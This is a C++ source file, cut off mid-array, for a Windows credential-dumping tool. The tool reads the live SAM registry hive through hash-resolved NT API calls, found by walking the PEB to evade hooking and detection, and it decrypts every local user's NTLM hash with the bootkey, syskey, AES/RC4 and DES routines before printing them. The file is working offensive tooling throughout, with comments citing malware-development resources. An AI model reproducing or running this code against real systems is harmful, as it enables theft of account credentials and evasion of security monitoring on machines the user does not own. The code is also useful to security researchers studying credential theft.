// Peter Gabaldon. https://pgj11.com/.
// Dumping SAM with custom call stacks, API hashing and walking PEB. Thanks to this resources
// https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/
// https://0xdarkvortex.dev/hiding-in-plainsight/
// https://0xpat.github.io/Malware_development_part_4/

//#define _CRT_SECURE_NO_WARNINGS

#include <ctype.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <Windows.h>
#include <winternl.h>

#include "include/main.h"
#include "include/proxyNtCalls.h"
#include "include/shadowMethod.h"

#include "include/cryptopp/aes.h"
using CryptoPP::AES;

#include "include/cryptopp/ccm.h"
using CryptoPP::CBC_Mode;
using CryptoPP::ECB_Mode;

#include "include/cryptopp/filters.h"
using CryptoPP::ArraySource;
using CryptoPP::StreamTransformationFilter;
using CryptoPP::ArraySink;
using CryptoPP::Redirector;

#include "include/cryptopp/md5.h"
using CryptoPP::MD5;

#include "include/cryptopp/arc4.h"
using CryptoPP::ARC4;

#include "include/cryptopp/des.h"
using CryptoPP::DES;

// Globals "myFuncs"
myMessageBox pMyMessageBox;
myNtOpenKey pMyNtOpenKey;
myNtQueryKey pMyNtQueryKey;
myNtEnumerateKey pMyNtEnumerateKey;
myNtQueryValueKey pMyNtQueryValueKey;
myNtEnumerateValueKey pMyNtEnumerateValueKey;
myNtClose pMyNtClose;
myRtlInitUnicodeString pMyRtlInitUnicodeString;

BOOL gDebugEnabled = FALSE;

static void DebugPrintPrefix() {
	printf("[DEBUG] ");
}

void DebugPrintf(const CHAR* format, ...) {
	if (!gDebugEnabled) {
		return;
	}

	DebugPrintPrefix();

	va_list args;
	va_start(args, format);
	vprintf(format, args);
	va_end(args);
}

void DebugWPrintf(const WCHAR* format, ...) {
	if (!gDebugEnabled) {
		return;
	}

	DebugPrintPrefix();

	va_list args;
	va_start(args, format);
	vwprintf(format, args);
	va_end(args);
}

static void DebugPrintHexInternal(const CHAR* label, const BYTE* data, ULONG totalLength, ULONG printLength) {
	if (!gDebugEnabled) {
		return;
	}

	DebugPrintf("%s (%lu bytes", label, totalLength);
	if (printLength < totalLength) {
		printf(", showing %lu", printLength);
	}
	printf("):");

	if (data == NULL) {
		printf(" <null>\n");
		return;
	}

	if (printLength == 0) {
		printf(" <empty>\n");
		return;
	}

	for (ULONG i = 0; i < printLength; i++) {
		if ((i % 16) == 0) {
			printf("\n[DEBUG]   ");
		}
		printf("%02X", data[i]);
		if ((i % 16) != 15 && i + 1 < printLength) {
			printf(" ");
		}
	}

	if (printLength < totalLength) {
		printf("\n[DEBUG]   ... truncated ...");
	}
	printf("\n");
}

void DebugPrintHex(const CHAR* label, const BYTE* data, ULONG length) {
	DebugPrintHexInternal(label, data, length, length);
}

void DebugPrintHexPreview(const CHAR* label, const BYTE* data, ULONG length, ULONG maxLength) {
	ULONG printLength = length;
	if (printLength > maxLength) {
		printLength = maxLength;
	}
	DebugPrintHexInternal(label, data, length, printLength);
}

void DebugPrintWideString(const CHAR* label, const WCHAR* value) {
	if (!gDebugEnabled) {
		return;
	}

	DebugPrintPrefix();
	printf("%s: ", label);
	if (value == NULL) {
		printf("<null>\n");
		return;
	}
	wprintf(L"%ls\n", value);
}

void DebugPrintWideLength(const CHAR* label, const WCHAR* value, ULONG charLength) {
	if (!gDebugEnabled) {
		return;
	}

	DebugPrintPrefix();
	printf("%s: ", label);
	if (value == NULL) {
		printf("<null>\n");
		return;
	}
	wprintf(L"%.*ls\n", (int)charLength, value);
}

static BOOL CopyCountedWideString(WCHAR* destination, size_t destinationChars, const WCHAR* source, ULONG sourceBytes) {
	if (destination == NULL || destinationChars == 0 || source == NULL || (sourceBytes % sizeof(WCHAR)) != 0) {
		return FALSE;
	}

	size_t sourceChars = sourceBytes / sizeof(WCHAR);
	if (sourceChars >= destinationChars) {
		return FALSE;
	}

	CopyMemory(destination, source, sourceBytes);
	destination[sourceChars] = L'\0';
	return TRUE;
}

static BOOL CountedWideStringEquals(const WCHAR* value, ULONG valueBytes, const WCHAR* expected) {
	if (value == NULL || expected == NULL) {
		return FALSE;
	}

	size_t expectedBytes = wcslen(expected) * sizeof(WCHAR);
	return valueBytes == expectedBytes && memcmp(value, expected, expectedBytes) == 0;
}

void DebugPrintGuid(const CHAR* label, REFGUID guid) {
	if (!gDebugEnabled) {
		return;
	}

	DebugPrintf("%s: {%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n",
		label,
		(ULONG)guid.Data1,
		(UINT)guid.Data2,
		(UINT)guid.Data3,
		(UINT)guid.Data4[0],
		(UINT)guid.Data4[1],
		(UINT)guid.Data4[2],
		(UINT)guid.Data4[3],
		(UINT)guid.Data4[4],
		(UINT)guid.Data4[5],
		(UINT)guid.Data4[6],
		(UINT)guid.Data4[7]);
}

// Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
FARPROC myGetProcAddress(DWORD moduleHash, DWORD exportHash) {
	PPEB pPEB = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
	PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
	PLIST_ENTRY listCurrent = listHead->Flink;
	PVOID moduleAddress = NULL;
	do
	{
		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
		PCHAR dllPath = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
		WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllPath, dllNameLength, NULL, NULL);
		CharUpperA(dllPath);

		CHAR* last = strrchr(dllPath, '\\');
		last++;
		if (HashString2A(last) == moduleHash)
		{
			moduleAddress = dllEntry->DllBase;
			HeapFree(GetProcessHeap(), 0, dllPath);
			break;
		}
		HeapFree(GetProcessHeap(), 0, dllPath);
		listCurrent = listCurrent->Flink;
	} while (listCurrent != listHead);

	if (moduleAddress == NULL) {
		return NULL;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)moduleAddress;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)moduleAddress + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)moduleAddress + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)moduleAddress + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)moduleAddress + pExportDirectory->AddressOfNameOrdinals);

	FARPROC found = NULL;

	for (unsigned int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
		PCSTR pFunctionName = (PSTR)((PBYTE)moduleAddress + pAddressOfNames[i]);
		if (HashString2A(pFunctionName) == exportHash)
		{
			found = (FARPROC)((PBYTE)moduleAddress + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}
	return found;
}

/*
* NtOpenKey -> RegOpenKey, RegOpenKeyEx
* NtQueryKey -> RegQueryInfoKey
* NtEnumerateKey -> RegEnumerateKey, RegEnumerateKeyEx, RegEnumKey, RegEnumKeyEx
* NtQueryValueKey -> RegQueryValue, RegQueryValueEx
* NtEnumerateValueKey -> RegEnumValue
*
*/
void getSAM(PSAM samRegEntries[], PULONG size) {
	HANDLE key;
	HANDLE subKeyV;
	HANDLE subKeyF;
	OBJECT_ATTRIBUTES attributes;
	OBJECT_ATTRIBUTES attributesSubKeyV;
	OBJECT_ATTRIBUTES attributesSubKeyF;
	UNICODE_STRING UnicodeRegPath;
	UNICODE_STRING UnicodeRegPathSubKeyV;
	UNICODE_STRING UnicodeRegPathSubKeyF;
	ULONG lengthBuff;
	PKEY_FULL_INFORMATION keyInfo = NULL;
	PKEY_FULL_INFORMATION keyInfoSubKeyV = NULL;
	PKEY_FULL_INFORMATION keyInfoSubKeyF = NULL;
	PKEY_BASIC_INFORMATION keyInfoSubKeysBasic = NULL;
	PKEY_VALUE_FULL_INFORMATION keyValuesSubKey = NULL;
	WCHAR RegPath[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\',L'U',L's',L'e',L'r',L's',L'\\', L'\0' };
	DWORD maxLenOfNames;
	ULONG nEntries = 0;
	PSAM sams[MAX_SAM_ENTRIES] = {};

	DWORD ret;

	DebugPrintf("Collecting SAM entries from live registry\n");
	if (samRegEntries == NULL) {
		DebugPrintf("SAM output buffer is NULL; probing entry count and byte size\n");
	}
	DebugPrintWideString("Live SAM Users key path", RegPath);

	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
	DebugPrintf("NtOpenKey(SAM Users) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);
	DebugPrintf("NtQueryKey(SAM Users size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);

	keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

	ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);
	DebugPrintf("NtQueryKey(SAM Users full information) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	DebugPrintf("SAM Users subkeys found: %lu; processing at most %d\n", keyInfo->SubKeys, MAX_SAM_ENTRIES);

	for (ULONG i = 0; i < keyInfo->SubKeys && i < MAX_SAM_ENTRIES; i++) {
		maxLenOfNames = MAX_KEY_LENGTH;

		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, NULL, 0, &lengthBuff);
		DebugPrintf("NtEnumerateKey(SAM Users[%lu] size probe) returned 0x%08lX; required bytes: %lu\n", i, ret, lengthBuff);

		keyInfoSubKeysBasic = (PKEY_BASIC_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, keyInfoSubKeysBasic, lengthBuff, &lengthBuff);
		DebugPrintf("NtEnumerateKey(SAM Users[%lu]) returned 0x%08lX\n", i, ret);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		DebugPrintWideLength("SAM Users subkey name", keyInfoSubKeysBasic->Name, keyInfoSubKeysBasic->NameLength / sizeof(WCHAR));

		WCHAR ridName[MAX_KEY_LENGTH] = {};
		if (!CopyCountedWideString(ridName, MAX_KEY_LENGTH, keyInfoSubKeysBasic->Name, keyInfoSubKeysBasic->NameLength)) {
			DebugPrintf("Skipping SAM Users subkey with invalid name length: %lu bytes\n", keyInfoSubKeysBasic->NameLength);
			HeapFree(GetProcessHeap(), 0, keyInfoSubKeysBasic);
			continue;
		}

		if (wcsncmp(L"00", ridName, wcslen(L"00")) == 0) {
			WCHAR RegPathSubKeyV[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\',L'U',L's',L'e',L'r',L's',L'\\', L'\0' };
			wcsncat_s(RegPathSubKeyV, MAX_PATH, ridName, _TRUNCATE);
			DebugPrintWideString("Processing RID key", RegPathSubKeyV);

			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyV, RegPathSubKeyV);
			InitializeObjectAttributes(&attributesSubKeyV, &UnicodeRegPathSubKeyV, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ret = pMyNtOpenKey(&subKeyV, KEY_READ, &attributesSubKeyV);
			DebugPrintf("NtOpenKey(RID V key) returned 0x%08lX\n", ret);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = pMyNtQueryKey(subKeyV, KeyFullInformation, NULL, 0, &lengthBuff);
			DebugPrintf("NtQueryKey(RID V size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);

			keyInfoSubKeyV = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

			ret = pMyNtQueryKey(subKeyV, KeyFullInformation, keyInfoSubKeyV, lengthBuff, &lengthBuff);
			DebugPrintf("NtQueryKey(RID V full information) returned 0x%08lX\n", ret);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAM));
			wcscpy_s(sam->rid, MAX_KEY_LENGTH, ridName);
			DebugPrintWideString("RID selected for SAM entry", sam->rid);

			getClasses(sam);
			DebugPrintWideString("SYSTEM LSA class material collected for RID", sam->classes);

			for (ULONG j = 0; j < keyInfoSubKeyV->Values; j++) {
				ret = pMyNtEnumerateValueKey(subKeyV, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
				DebugPrintf("NtEnumerateValueKey(RID value[%lu] size probe) returned 0x%08lX; required bytes: %lu\n", j, ret, lengthBuff);

				keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

				ret = pMyNtEnumerateValueKey(subKeyV, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
				DebugPrintf("NtEnumerateValueKey(RID value[%lu]) returned 0x%08lX\n", j, ret);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}

				DebugPrintWideLength("RID value name", keyValuesSubKey->Name, keyValuesSubKey->NameLength / sizeof(WCHAR));

				if (CountedWideStringEquals(keyValuesSubKey->Name, keyValuesSubKey->NameLength, L"V")) {
					PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
					CopyMemory(sam->v, data, keyValuesSubKey->DataLength);
					sam->vLen = keyValuesSubKey->DataLength;
					DebugPrintf("Captured SAM V value for RID; length: %lu bytes\n", sam->vLen);
					DebugPrintHexPreview("SAM V value preview", sam->v, sam->vLen, 64);
				}
				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
			}
			WCHAR RegPathSubKeyF[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\', L'\0' };
			DebugPrintWideString("Opening SAM Account key for F value", RegPathSubKeyF);
			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyF, RegPathSubKeyF);
			InitializeObjectAttributes(&attributesSubKeyF, &UnicodeRegPathSubKeyF, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ret = pMyNtOpenKey(&subKeyF, KEY_READ, &attributesSubKeyF);
			DebugPrintf("NtOpenKey(Account F key) returned 0x%08lX\n", ret);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = pMyNtQueryKey(subKeyF, KeyFullInformation, NULL, 0, &lengthBuff);
			DebugPrintf("NtQueryKey(Account F size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);

			keyInfoSubKeyF = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

			ret = pMyNtQueryKey(subKeyF, KeyFullInformation, keyInfoSubKeyF, lengthBuff, &lengthBuff);
			DebugPrintf("NtQueryKey(Account F full information) returned 0x%08lX\n", ret);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			for (ULONG j = 0; j < keyInfoSubKeyF->Values; j++) {
				ret = pMyNtEnumerateValueKey(subKeyF, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
				DebugPrintf("NtEnumerateValueKey(Account value[%lu] size probe) returned 0x%08lX; required bytes: %lu\n", j, ret, lengthBuff);

				keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

				ret = pMyNtEnumerateValueKey(subKeyF, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
				DebugPrintf("NtEnumerateValueKey(Account value[%lu]) returned 0x%08lX\n", j, ret);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}

				DebugPrintWideLength("Account value name", keyValuesSubKey->Name, keyValuesSubKey->NameLength / sizeof(WCHAR));

				if (CountedWideStringEquals(keyValuesSubKey->Name, keyValuesSubKey->NameLength, L"F")) {
					PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
					CopyMemory(sam->f, data, keyValuesSubKey->DataLength);
					sam->fLen = keyValuesSubKey->DataLength;
					DebugPrintf("Captured SAM F value for RID; length: %lu bytes\n", sam->fLen);
					DebugPrintHexPreview("SAM F value preview", sam->f, sam->fLen, 64);
				}
				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
			}

			sams[nEntries] = sam;
			nEntries++;
			DebugPrintf("Stored SAM entry index %lu\n", nEntries - 1);
			HeapFree(GetProcessHeap(), 0, keyInfoSubKeyV);
			HeapFree(GetProcessHeap(), 0, keyInfoSubKeyF);
			pMyNtClose(subKeyV);
			pMyNtClose(subKeyF);
		}
		HeapFree(GetProcessHeap(), 0, keyInfoSubKeysBasic);
	}

	HeapFree(GetProcessHeap(), 0, keyInfo);
	pMyNtClose(key);

	ULONG lenRet = nEntries * sizeof(SAM);
	CopyMemory(size, &lenRet, sizeof(ULONG));
	DebugPrintf("Live registry SAM collection completed: %lu entries, %lu bytes\n", nEntries, lenRet);

	if (samRegEntries != NULL) {
		for (int i = 0; i < nEntries; i++) {
			samRegEntries[i] = sams[i];
			//HeapFree(GetProcessHeap(), 0, sams[i]);
		}
	}

	return;
}


void decryptSAM(PSAM samRegEntries[], int entries) {
	CHAR strMagic1[] = { '!','@','#','$','%','^','&','*','(',')','q','w','e','r','t','y','U','I','O','P','A','z','x','c','v','b','n','m','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q',')','(','*','@','&','%', '\0' };
	CHAR strMagic2[] = { '0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9', '\0' };
	CHAR strMagic3[] = { 'N','T','P','A','S','S','W','O','R','D', '\0' };

	DebugPrintf("Starting SAM decryption for %d entries\n", entries);

	for (int i = 0; i < entries; i++) {
		DebugPrintf("---- Decrypting SAM entry %d ----\n", i);
		DebugPrintWideString("Entry RID", samRegEntries[i]->rid);
		DebugPrintf("Input V length: %lu bytes; F length: %lu bytes\n", samRegEntries[i]->vLen, samRegEntries[i]->fLen);

		LONG offset = 0;
		CopyMemory(&offset, &samRegEntries[i]->v[0x0C], 4);
		DebugPrintf("Username relative offset read from V[0x0C]: 0x%08lX\n", (ULONG)offset);
		offset += 0xCC;
		DebugPrintf("Username absolute offset after V header adjustment: 0x%08lX\n", (ULONG)offset);

		LONG lenUsername = (LONG)samRegEntries[i]->v[0x10];
		DebugPrintf("Username length read from V[0x10]: %ld bytes\n", lenUsername);
		PWCHAR username = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lenUsername + sizeof(WCHAR));
		CopyMemory(username, &samRegEntries[i]->v[offset], lenUsername);
		DebugPrintWideLength("Username recovered from V record", username, lenUsername / sizeof(WCHAR));

		offset = 0;
		CopyMemory(&offset, &samRegEntries[i]->v[0xA8], 4);
		DebugPrintf("NTLM hash relative offset read from V[0xA8]: 0x%08lX\n", (ULONG)offset);
		offset += 0xCC;
		DebugPrintf("NTLM hash absolute offset after V header adjustment: 0x%08lX\n", (ULONG)offset);
		DebugPrintf("NTLM hash storage marker V[0xAC]: 0x%02X\n", samRegEntries[i]->v[0xAC]);

		BYTE bootKey[16];
		getBootKey(samRegEntries[i], bootKey);
		DebugPrintHex("Bootkey derived from SYSTEM LSA class material", bootKey, 16);

		BYTE encNTLMrecovered[16] = {};

		if (samRegEntries[i]->v[0xAC] == 0x38) {
			DebugPrintf("Using post-Windows 10 1909 AES path for syskey and NTLM hash blob\n");
			BYTE encSyskey[16] = {};
			BYTE encSyskeyIV[16] = {};
			// encSyskeyKey = bootkey
			CopyMemory(encSyskey, &samRegEntries[i]->f[0x88], 16);
			CopyMemory(encSyskeyIV, &samRegEntries[i]->f[0x78], 16);
			DebugPrintHex("Encrypted syskey from F[0x88]", encSyskey, 16);
			DebugPrintHex("Syskey AES-CBC IV from F[0x78]", encSyskeyIV, 16);
			DebugPrintHex("Syskey AES-CBC key (bootkey)", bootKey, 16);

			CBC_Mode< AES >::Decryption d;
			d.SetKeyWithIV(bootKey, 16, encSyskeyIV, 16);

			BYTE sysKey[16] = {};
			ArraySink rs(sysKey, 16);
			ArraySource s(encSyskey, 16, true,
				new StreamTransformationFilter(d,
					new Redirector(rs),
					StreamTransformationFilter::NO_PADDING
				)
			);
			DebugPrintHex("Recovered syskey from AES-CBC(encSyskey, bootkey, F IV)", sysKey, 16);

			BYTE encNTLMIV[16] = {};
			BYTE encNTLM[16] = {};
			CopyMemory(encNTLMIV, &samRegEntries[i]->v[offset + 0x8], 16);
			CopyMemory(encNTLM, &samRegEntries[i]->v[offset + 0x18], 16);
			// encNTLMKey = sysKey
			DebugPrintf("NTLM AES blob uses IV at V[0x%08lX] and ciphertext at V[0x%08lX]\n", (ULONG)(offset + 0x8), (ULONG)(offset + 0x18));
			DebugPrintHex("Encrypted NTLM AES-CBC IV", encNTLMIV, 16);
			DebugPrintHex("Encrypted NTLM hash blob", encNTLM, 16);
			DebugPrintHex("NTLM AES-CBC key (recovered syskey)", sysKey, 16);

			CBC_Mode< AES >::Decryption d2;
			d2.SetKeyWithIV(sysKey, 16, encNTLMIV, 16);

			ArraySink rs2(encNTLMrecovered, 16);
			ArraySource s2(encNTLM, 16, true,
				new StreamTransformationFilter(d2,
					new Redirector(rs2),
					StreamTransformationFilter::NO_PADDING
				)
			);
			DebugPrintHex("DES-encrypted NTLM hash recovered from AES-CBC", encNTLMrecovered, 16);

		}
		else if (samRegEntries[i]->v[0xAC] == 0x14) {
			DebugPrintf("Using legacy RC4 path for syskey and NTLM hash blob\n");
			BYTE encSyskey[16] = {};
			BYTE encSyskeyKey[16] = {};
			CopyMemory(encSyskey, &samRegEntries[i]->f[0x80], 16);
			DebugPrintHex("Encrypted syskey from F[0x80]", encSyskey, 16);
			DebugPrintHex("RC4 syskey salt from F[0x70]", &samRegEntries[i]->f[0x70], 16);
			DebugPrintf("RC4 syskey MD5 input: F[0x70] salt + magic1 + bootkey + magic2\n");
			DebugPrintf("magic1: %s\n", strMagic1);
			DebugPrintf("magic2: %s\n", strMagic2);
			DebugPrintHex("Bootkey used in RC4 syskey MD5 input", bootKey, 16);

			MD5 hash;

			hash.Update(&samRegEntries[i]->f[0x70], 16);
			hash.Update((PBYTE)&strMagic1, strlen(strMagic1));
			hash.Update((PBYTE)&bootKey, 16);
			hash.Update((PBYTE)&strMagic2, strlen(strMagic2));
			hash.Final(encSyskeyKey);
			DebugPrintHex("RC4 key for syskey generated by MD5", encSyskeyKey, 16);

			BYTE sysKey[16] = {};

			ARC4::Decryption dec;
			dec.SetKey(encSyskeyKey, 16);

			dec.ProcessData(sysKey, encSyskey, 16);
			DebugPrintHex("Recovered syskey from RC4(encSyskey, MD5 key)", sysKey, 16);

			BYTE encNTLMKey[16] = {};
			BYTE encNTLM[16] = {};
			CopyMemory(encNTLMKey, &samRegEntries[i]->v[offset + 0x4], 16);
			CopyMemory(encNTLM, &samRegEntries[i]->v[offset + 0x4], 16);
			DebugPrintf("Legacy NTLM encrypted blob copied from V[0x%08lX]\n", (ULONG)(offset + 0x4));
			DebugPrintHex("Encrypted NTLM RC4 blob", encNTLM, 16);

			BYTE aux[4] = {};
			getAuxSyskey(samRegEntries[i], aux);
			DebugPrintHex("RID-derived RC4 NTLM aux value", aux, 4);
			DebugPrintf("RC4 NTLM MD5 input: recovered syskey + RID aux + magic3\n");
			DebugPrintf("magic3: %s\n", strMagic3);

			MD5 hash2;
			hash2.Update(sysKey, 16);
			hash2.Update(aux, 4);
			hash2.Update((PBYTE)&strMagic3, strlen(strMagic3));
			hash2.Final(encNTLMKey);
			DebugPrintHex("RC4 key for NTLM hash blob generated by MD5", encNTLMKey, 16);

			ARC4::Decryption dec2;
			dec2.SetKey(encNTLMKey, 16);
			dec2.ProcessData(encNTLMrecovered, encNTLM, 16);
			DebugPrintHex("DES-encrypted NTLM hash recovered from RC4", encNTLMrecovered, 16);

		}
		else {
			// TODO default: return blank hash 31D6CFE0D16AE931B73C59D7E0C089C0 or print some error
			DebugPrintf("Unsupported NTLM hash storage marker 0x%02X; DES stage will receive zeroed data\n", samRegEntries[i]->v[0xAC]);
		}

		/* TODO: REFACTOR THIS */
		BYTE desStr1[7] = {};
		getDESStr1(samRegEntries[i], desStr1);

		BYTE desStr2[7] = {};
		getDESStr2(samRegEntries[i], desStr2);

		BYTE desKey1[8] = {};
		BYTE desKey2[8] = {};
		// desKey1IV = desKey1
		// desKey2IV = desKey2
		strToKey(desStr1, desKey1);
		strToKey(desStr2, desKey2);
		DebugPrintHex("RID-derived DES source 1", desStr1, 7);
		DebugPrintHex("RID-derived DES source 2", desStr2, 7);
		DebugPrintHex("DES key 1 after odd parity expansion", desKey1, 8);
		DebugPrintHex("DES key 2 after odd parity expansion", desKey2, 8);

		ECB_Mode< DES >::Decryption desD;
		desD.SetKey(desKey1, 8);

		BYTE encNTLM1[8] = {};
		BYTE encNTLM2[8] = {};
		CopyMemory(encNTLM1, encNTLMrecovered, 8);
		CopyMemory(encNTLM2, encNTLMrecovered + 0x8, 8);
		DebugPrintHex("First DES-encrypted NTLM half", encNTLM1, 8);
		DebugPrintHex("Second DES-encrypted NTLM half", encNTLM2, 8);

		BYTE NTLM1[8] = {};
		BYTE NTLM2[8] = {};

		ArraySink rs(NTLM1, 8);
		ArraySource s(encNTLM1, 8, true,
			new StreamTransformationFilter(desD,
				new Redirector(rs),
				StreamTransformationFilter::NO_PADDING
			)
		);
		DebugPrintHex("First NTLM half after DES-ECB", NTLM1, 8);

		ECB_Mode< DES >::Decryption desD2;
		desD2.SetKey(desKey2, 8);

		ArraySink rs2(NTLM2, 8);
		ArraySource s2(encNTLM2, 8, true,
			new StreamTransformationFilter(desD2,
				new Redirector(rs2),
				StreamTransformationFilter::NO_PADDING
			)
		);
		DebugPrintHex("Second NTLM half after DES-ECB", NTLM2, 8);

		BYTE NTLM[16] = {};
		CHAR NTLMstr[33] = {};
		int ridN = (int)wcstol(samRegEntries[i]->rid, NULL, 16);
		CopyMemory(NTLM, NTLM1, 8);
		CopyMemory(NTLM + 0x8, NTLM2, 8);
		DebugPrintHex("Final NTLM hash bytes", NTLM, 16);

		for (int i = 0; i < 16; i++) {
			sprintf_s(NTLMstr + (i * 2), 3, "%02x", NTLM[i]);
		}

		toUpperStr(NTLMstr);
		DebugPrintf("Final NTLM hash string: %s\n", NTLMstr);

		wprintf(L"User [ %s ] with RID [ %d ] -> ", username, ridN);
		printf("NT: %s\n", NTLMstr);

		HeapFree(GetProcessHeap(), 0, username);
	}
}

void strToKey(PBYTE s, PBYTE keyRet) {
	BYTE oddParity[] = { 0x1, 0x1, 0x2, 0x2, 0x4, 0x4, 0x7, 0x7, 0x8, 0x8, 0xb, 0xb, 0xd, 0xd, 0xe, 0xe, 0x10, 0x10, 0x13, 0x13, 0x15, 0x15, 0x16, 0x16, 0x19, 0x19, 0x1a, 0x1a, 0x1c, 0x1c, 0x1f, 0x1f, 0x20, 0x20, 0x23, 0x23, 0x25, 0x25, 0x26, 0x26, 0x29, 0x29, 0x2a, 0x2a, 0x2c, 0x2c, 0x2f, 0x2f, 0x31, 0x31, 0x32, 0x32, 0x34, 0x34, 0x37, 0x37, 0x38, 0x38, 0x3b, 0x3b, 0x3d, 0x3d, 0x3e, 0x3e, 0x40, 0x40, 0x43, 0x43, 0x45, 0x45, 0x46, 0x46, 0x49, 0x49, 0x4a, 0x4a, 0x4c, 0x4c, 0x4f, 0x4f, 0x51, 0x51, 0x52, 0x52, 0x54, 0x54, 0x57, 0x57, 0x58, 0x58, 0x5b, 0x5b, 0x5d, 0x5d, 0x5e, 0x5e, 0x61, 0x61, 0x62, 0x62, 0x64, 0x64, 0x67, 0x67, 0x68, 0x68, 0x6b, 0x6b, 0x6d, 0x6d, 0x6e, 0x6e, 0x70, 0x70, 0x73, 0x73, 0x75, 0x75, 0x76, 0x76, 0x79, 0x79, 0x7a, 0x7a, 0x7c, 0x7c, 0x7f, 0x7f, 0x80, 0x80, 0x83, 0x83, 0x85, 0x85, 0x86, 0x86, 